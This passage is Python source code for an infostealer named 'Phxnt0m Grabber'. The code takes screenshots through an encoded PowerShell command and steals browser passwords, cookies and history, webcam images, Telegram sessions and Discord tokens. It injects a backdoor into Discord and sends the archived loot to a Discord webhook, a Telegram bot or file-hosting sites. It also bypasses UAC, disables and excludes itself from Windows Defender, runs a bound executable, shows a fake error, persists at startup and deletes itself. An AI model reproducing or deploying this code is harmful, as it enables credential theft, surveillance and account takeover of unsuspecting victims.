            command = 'JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA='
            if subprocess.run(['powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', command], shell=True, capture_output=True, cwd=self.TempFolder).returncode == 0:
                self.Screenshot = True

    @Errors.Catch
    def BlockSites(self) -> None:
        if Settings.BlockAvSites:
            Logger.info('Blocking AV sites')
            Utility.BlockSites()
            Utility.TaskKill('chrome', 'firefox', 'msedge', 'safari', 'opera', 'iexplore')

    @Errors.Catch
    def StealBrowserData(self) -> None:
        if not any((Settings.CaptureCookies, Settings.CapturePasswords, Settings.CaptureHistory)):
            return
        Logger.info('Stealing browser data')
        threads: list[Thread] = []
        paths = {'Brave': (os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'brave'), 'Chrome': (os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'), 'chrome'), 'Chromium': (os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'), 'chromium'), 'Comodo': (os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'), 'comodo'), 'Edge': (os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'), 'msedge'), 'EpicPrivacy': (os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'), 'epic'), 'Iridium': (os.path.join(os.getenv('localappdata'), 'Iridium', 'User Data'), 'iridium'), 'Opera': (os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'), 'opera'), 'Opera GX': (os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'), 'operagx'), 'Slimjet': (os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'), 'slimjet'), 'UR': (os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'), 'urbrowser'), 'Vivaldi': (os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'), 'vivaldi'), 'Yandex': (os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data'), 'yandex')}
        for name, item in paths.items():
            path, procname = item
            if os.path.isdir(path):

                def run(name, path):
                    try:
                        Utility.TaskKill(procname)
                        browser = Browsers.Chromium(path)
                        saveToDir = os.path.join(self.TempFolder, 'Credentials', name)
                        passwords = browser.GetPasswords() if Settings.CapturePasswords else None
                        cookies = browser.GetCookies() if Settings.CaptureCookies else None
                        history = browser.GetHistory() if Settings.CaptureHistory else None
                        if passwords or cookies or history:
                            os.makedirs(saveToDir, exist_ok=True)
                            if passwords:
                                output = ['URL: {}\nUsername: {}\nPassword: {}'.format(*x) for x in passwords]
                                with open(os.path.join(saveToDir, '{} Passwords.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                                self.PasswordsCount += len(passwords)
                            if cookies:
                                output = ['{}\t{}\t{}\t{}\t{}\t{}\t{}'.format(host, str(expiry != 0).upper(), cpath, str(not host.startswith('.')).upper(), expiry, cname, cookie) for host, cname, cpath, cookie, expiry in cookies]
                                with open(os.path.join(saveToDir, '{} Cookies.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write('\n'.join(output))
                                self.Cookies.extend([str(x[3]) for x in cookies])
                            if history:
                                output = ['URL: {}\nTitle: {}\nVisits: {}'.format(*x) for x in history]
                                with open(os.path.join(saveToDir, '{} History.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                                self.HistoryCount += len(history)
                    except Exception:
                        pass
                t = Thread(target=run, args=(name, path))
                t.start()
                threads.append(t)
        for thread in threads:
            thread.join()
        if Settings.CaptureGames:
            self.StealRobloxCookies()

    @Errors.Catch
    def Webshot(self) -> None:
        if Settings.CaptureWebcam:
            camdir = os.path.join(self.TempFolder, 'Webcam')
            os.makedirs(camdir, exist_ok=True)
            camIndex = 0
            while Syscalls.CaptureWebcam(camIndex, os.path.join(camdir, 'Webcam (%d).bmp' % (camIndex + 1))):
                camIndex += 1
                self.WebcamPicturesCount += 1
            if self.WebcamPicturesCount == 0:
                shutil.rmtree(camdir)

    @Errors.Catch
    def StealTelegramSessions(self) -> None:
        if Settings.CaptureTelegram:
            Logger.info('Stealing telegram sessions')
            telegramPaths = []
            loginPaths = []
            files = []
            dirs = []
            has_key_datas = False
            process = subprocess.run('reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall', shell=True, capture_output=True)
            if process.returncode == 0:
                paths = [x for x in process.stdout.decode(errors='ignore').splitlines() if x.strip()]
                for path in paths:
                    process = subprocess.run('reg query "{}" /v DisplayIcon'.format(path), shell=True, capture_output=True)
                    if process.returncode == 0:
                        path = process.stdout.strip().decode().split(' ' * 4)[-1].split(',')[0]
                        if 'telegram' in path.lower():
                            telegramPaths.append(os.path.dirname(path))
            if not telegramPaths:
                telegramPaths.append(os.path.join(os.getenv('appdata'), 'Telegram Desktop'))
            for path in telegramPaths:
                path = os.path.join(path, 'tdata')
                if os.path.isdir(path):
                    for item in os.listdir(path):
                        itempath = os.path.join(path, item)
                        if item == 'key_datas':
                            has_key_datas = True
                            loginPaths.append(itempath)
                        if os.path.isfile(itempath):
                            files.append(item)
                        else:
                            dirs.append(item)
                    for filename in files:
                        for dirname in dirs:
                            if dirname + 's' == filename:
                                loginPaths.extend([os.path.join(path, x) for x in (filename, dirname)])
            if has_key_datas and len(loginPaths) - 1 > 0:
                saveToDir = os.path.join(self.TempFolder, 'Messenger', 'Telegram')
                os.makedirs(saveToDir, exist_ok=True)
                for path in loginPaths:
                    try:
                        if os.path.isfile(path):
                            shutil.copy(path, os.path.join(saveToDir, os.path.basename(path)))
                        else:
                            shutil.copytree(path, os.path.join(saveToDir, os.path.basename(path)), dirs_exist_ok=True)
                    except Exception:
                        shutil.rmtree(saveToDir)
                        return
                self.TelegramSessionsCount += int((len(loginPaths) - 1) / 2)

    @Errors.Catch
    def StealDiscordTokens(self) -> None:
        if Settings.CaptureDiscordTokens:
            Logger.info('Stealing discord tokens')
            output = list()
            saveToDir = os.path.join(self.TempFolder, 'Messenger', 'Discord')
            accounts = Discord.GetTokens()
            if accounts:
                for item in accounts:
                    USERNAME, USERID, MFA, EMAIL, PHONE, VERIFIED, NITRO, BILLING, TOKEN, GIFTS = item.values()
                    output.append('Username: {}\nUser ID: {}\nMFA enabled: {}\nEmail: {}\nPhone: {}\nVerified: {}\nNitro: {}\nBilling Method(s): {}\n\nToken: {}\n\n{}'.format(USERNAME, USERID, 'Yes' if MFA else 'No', EMAIL, PHONE, 'Yes' if VERIFIED else 'No', NITRO, BILLING, TOKEN, GIFTS).strip())
                os.makedirs(os.path.join(self.TempFolder, 'Messenger', 'Discord'), exist_ok=True)
                with open(os.path.join(saveToDir, 'Discord Tokens.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                self.DiscordTokensCount += len(accounts)
        if Settings.DiscordInjection and (not Utility.IsInStartup()):
            paths = Discord.InjectJs()
            if paths is not None:
                Logger.info('Injecting backdoor into discord')
                for dir in paths:
                    appname = os.path.basename(dir)
                    Utility.TaskKill(appname)
                    for root, _, files in os.walk(dir):
                        for file in files:
                            if file.lower() == appname.lower() + '.exe':
                                time.sleep(3)
                                filepath = os.path.dirname(os.path.realpath(os.path.join(root, file)))
                                UpdateEXE = os.path.join(dir, 'Update.exe')
                                DiscordEXE = os.path.join(filepath, '{}.exe'.format(appname))
                                subprocess.Popen([UpdateEXE, '--processStart', DiscordEXE], shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    def CreateArchive(self) -> tuple[str, str | None]:
        Logger.info('Creating archive')
        rarPath = os.path.join(sys._MEIPASS, 'rar.exe')
        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
            rarPath = os.path.join(sys._MEIPASS, 'rar.exe')
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or 'phantom'
                process = subprocess.run('{} a -r -hp{} "{}" *'.format(rarPath, password, self.ArchivePath), capture_output=True, shell=True, cwd=self.TempFolder)
                if process.returncode == 0:
                    return 'rar'
        shutil.make_archive(self.ArchivePath.rsplit('.', 1)[0], 'zip', self.TempFolder)
        return 'zip'

    def GenerateTree(self) -> None:
        if os.path.isdir(self.TempFolder):
            Logger.info('Generating tree')
            try:
                contents = '\n'.join(Utility.Tree((self.TempFolder, 'Stolen Data')))
                with open(os.path.join(self.TempFolder, 'Tree.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                    file.write(contents)
            except Exception:
                Logger.info('Failed to generate tree')

    def UploadToExternalService(self, path, filename=None) -> str | None:
        if os.path.isfile(path):
            Logger.info('Uploading %s to gofile' % (filename or 'file'))
            with open(path, 'rb') as file:
                fileBytes = file.read()
            if filename is None:
                filename = os.path.basename(path)
            http = PoolManager(cert_reqs='CERT_NONE')
            try:
                1 / 0
                server = json.loads(http.request('GET', 'https://api.gofile.io/getServer').data.decode())['data']['server']
                if server:
                    url = json.loads(http.request('POST', 'https://{}.gofile.io/uploadFile'.format(server), fields={'file': (filename, fileBytes)}).data.decode())['data']['downloadPage']
                    if url:
                        return url
            except Exception:
                try:
                    Logger.error('Failed to upload to gofile, trying to upload to anonfiles')
                    url = json.loads(http.request('POST', 'https://api.anonfiles.com/upload', fields={'file': (filename, fileBytes)}).data.decode())['data']['file']['url']['short']
                    return url
                except Exception:
                    Logger.error('Failed to upload to anonfiles')
                    return None

    def SendData(self) -> None:
        extention = self.CreateArchive()
        if os.path.isfile(self.ArchivePath):
            Logger.info('Sending data to C2')
            computerName = os.getenv('computername') or 'Unable to get computer name'
            computerOS = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()
            computerOS = computerOS[2].strip() if len(computerOS) >= 2 else 'Unable to detect OS'
            totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
            totalMemory = str(int(int(totalMemory[1]) / 1000000000)) + ' GB' if len(totalMemory) >= 1 else 'Unable to detect total memory'
            uuid = subprocess.run('wmic csproduct get uuid', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
            uuid = uuid[1].strip() if len(uuid) >= 1 else 'Unable to detect UUID'
            cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unable to detect CPU'
            gpu = subprocess.run('wmic path win32_VideoController get name', capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()
            gpu = gpu[2].strip() if len(gpu) >= 2 else 'Unable to detect GPU'
            productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unable to get product key'
            http = PoolManager(cert_reqs='CERT_NONE')
            try:
                r: dict = json.loads(http.request('GET', 'http://ip-api.com/json/?fields=225545').data.decode())
                if r.get('status') != 'success':
                    raise Exception('Failed')
                data = f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {(chr(9989) if r['mobile'] else chr(10062))}\n{'Proxy/VPN:'.ljust(20)} {(chr(9989) if r['proxy'] else chr(10062))}"
                if len(r['reverse']) != 0:
                    data += f"\nReverse DNS: {r['reverse']}"
            except Exception:
                ipinfo = '(Unable to get IP info)'
            else:
                ipinfo = data
            system_info = f'Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}'
            collection = {'Discord Accounts': self.DiscordTokensCount, 'Passwords': self.PasswordsCount, 'Cookies': len(self.Cookies), 'History': self.HistoryCount, 'Roblox Cookies': self.RobloxCookiesCount, 'Telegram Sessions': self.TelegramSessionsCount, 'Common Files': self.CommonFilesCount, 'Wallets': self.WalletsCount, 'Wifi Passwords': self.WifiPasswordsCount, 'Webcam': self.WebcamPicturesCount, 'Minecraft Sessions': self.MinecraftSessions, 'Epic Session': 'Yes' if self.EpicStolen else 'No', 'Steam Session': 'Yes' if self.SteamStolen else 'No', 'Uplay Session': 'Yes' if self.UplayStolen else 'No', 'Screenshot': 'Yes' if self.Screenshot else 'No', 'System Info': 'Yes' if self.SystemInfo else 'No'}
            grabbedInfo = '\n'.join([key.ljust(20) + ' : ' + str(value) for key, value in collection.items()])
            image_url = 'https://cdn.discordapp.com/attachments/1110191841963409458/1124749529984536707/Hotpot_3.png'
            image_url2 = 'https://cdn.discordapp.com/attachments/1123712233994719305/1124746006496555160/oni_5889166.png'
            payload_discord = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Phxnt0mWare', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/Phxnt0m1/Phxnt0mWare', 'color': 2303786, 'footer': {'text': 'Grabbed by Phxnt0m Grabber | https://github.com/Phxnt0m1/Phxnt0mWare'}, 'thumbnail': {'url': image_url}}], 'username': 'Phxnt0m', 'avatar_url': image_url2}
            payload_telegram = {'caption': f'<b>Phxnt0m Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
            filename = 'Phantom-{}.{}'.format(os.getlogin(), extention)
            if Settings.C2[0] == 0 and os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20 or (Settings.C2[0] == 1 and os.path.getsize(self.ArchivePath) / (1024 * 1024) > 40):
                url = self.UploadToExternalService(self.ArchivePath, filename)
                if url is None:
                    raise Exception('Failed to upload to external service')
            else:
                url = None
            fields = dict()
            if not url:
                with open(self.ArchivePath, 'rb') as file:
                    fileBytes = file.read()
                if Settings.C2[0] == 0:
                    fields['file'] = (filename, fileBytes)
                elif Settings.C2[0] == 1:
                    fields['document'] = (filename, fileBytes)
            elif Settings.C2[0] == 0:
                payload_discord['content'] += ' | Archive : {}'.format(url)
            elif Settings.C2[0] == 1:
                payload_telegram['caption'] += '\n\nArchive : {}'.format(url)
            if Settings.C2[0] == 0:
                fields['payload_json'] = json.dumps(payload_discord).encode()
                http.request('POST', Settings.C2[1], fields=fields)
            elif Settings.C2[0] == 1:
                token, chat_id = Settings.C2[1].split('$')
                fields.update(payload_telegram)
                fields.update({'chat_id': chat_id})
                http.request('POST', 'https://api.telegram.org/bot%s/sendDocument' % token, fields=fields)
        else:
            raise FileNotFoundError('Archive not found')
if __name__ == '__main__' and os.name == 'nt':
    Logger.info('Process started')
    if Settings.HideConsole:
        Syscalls.HideConsole()
    if not Utility.IsAdmin():
        Logger.warning('Admin privileges not available')
        if Utility.GetSelf()[1]:
            if not '--nouacbypass' in sys.argv and Settings.UacBypass:
                Logger.info('Trying to bypass UAC (Application will restart)')
                Utility.UACbypass()
            if not Utility.IsInStartup() and (not Settings.UacBypass):
                Logger.info('Showing UAC prompt to user (Application will restart)')
                ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, ' '.join(sys.argv), None, 1)
                os._exit(0)
    Logger.info('Trying to create mutex')
    if not Syscalls.CreateMutex(Settings.Mutex):
        Logger.info('Mutex already exists, exiting')
        os._exit(0)
    if Utility.GetSelf()[1]:
        Logger.info('Trying to exclude the file from Windows defender')
        Utility.ExcludeFromDefender()
    Logger.info('Trying to disable defender')
    Utility.DisableDefender()
    if Utility.GetSelf()[1] and (not Utility.IsInStartup()) and os.path.isfile(os.path.join(sys._MEIPASS, 'bound.exe')):
        try:
            Logger.info('Trying to extract bound file')
            if os.path.isfile((boundfile := os.path.join(os.getenv('temp'), 'bound.exe'))):
                Logger.info('Old bound file found, removing it')
                os.remove(boundfile)
            shutil.copy(os.path.join(sys._MEIPASS, 'bound.exe'), boundfile)
            Logger.info('Trying to exclude bound file from defender')
            Utility.ExcludeFromDefender(boundfile)
            Logger.info('Starting bound file')
            subprocess.Popen('start bound.exe', shell=True, cwd=os.path.dirname(boundfile), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        except Exception as e:
            Logger.error(e)
    if Utility.GetSelf()[1] and Settings.FakeError[0] and (not Utility.IsInStartup()):
        try:
            Logger.info('Showing fake error popup')
            title = Settings.FakeError[1][0].replace('"', '\\x22').replace("'", '\\x22')
            message = Settings.FakeError[1][1].replace('"', '\\x22').replace("'", '\\x22')
            icon = int(Settings.FakeError[1][2])
            cmd = 'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'{}\', 0, \'{}\', {}+16);close()"'.format(message, title, Settings.FakeError[1][2])
            subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        except Exception as e:
            Logger.error(e)
    if not Settings.Vmprotect or not VmProtect.isVM():
        if Utility.GetSelf()[1]:
            if Settings.Melt and (not Utility.IsInStartup()):
                Logger.info('Hiding the file')
                Utility.HideSelf()
        elif Settings.Melt:
            Logger.info('Deleting the file')
            Utility.DeleteSelf()
        try:
            if Utility.GetSelf()[1] and Settings.Startup and (not Utility.IsInStartup()):
                Logger.info('Trying to put the file in startup')
                path = Utility.PutInStartup()
                if path is not None:
                    Logger.info('Excluding the file from Windows defender in startup')
                    Utility.ExcludeFromDefender(path)
        except Exception:
            Logger.error('Failed to put the file in startup')
        while True:
            try:
                Logger.info('Checking internet connection')
                if Utility.IsConnectedToInternet():
                    Logger.info('Internet connection available, starting stealer (things will be running in parallel)')
                    Phxnt0mGrabber()
                    Logger.info('Stealer finished its work')
                    break
                else:
                    Logger.info('Internet connection not found, retrying in 10 seconds')
                    time.sleep(10)
            except Exception as e:
                if isinstance(e, KeyboardInterrupt):
                    os._exit(1)
                Logger.critical(e, exc_info=True)
                Logger.info('There was an error, retrying after 10 minutes')
                time.sleep(600)
        if Utility.GetSelf()[1] and Settings.Melt and (not Utility.IsInStartup()):
            Logger.info('Deleting the file')
            Utility.DeleteSelf()
        Logger.info('Process ended')